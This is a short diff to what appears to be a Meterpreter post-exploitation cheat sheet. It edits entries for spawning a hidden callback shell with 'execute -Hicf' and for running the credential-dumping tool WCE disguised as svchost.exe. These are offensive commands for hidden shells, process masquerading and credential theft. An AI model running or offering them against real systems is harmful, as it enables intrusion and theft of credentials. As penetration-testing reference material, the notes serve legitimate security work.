@@ -30,9 +30,13 @@ OPTIONS:
 
 * Spawn Callback Shell
 
-`meterpreter > execute -Hicf shell.exe`
+```
+meterpreter > execute -Hicf shell.exe
 
-* Dummy Process
+meterpreter > execute -Hicf ./shell
+```
+
+* Spawn a executable program as a dummy process with `-d` flag.
 
 `meterpreter > execute -Hicmd svchost.exe -f /usr/share/windows-resources/wce/wce64.exe -a "-h"`
 
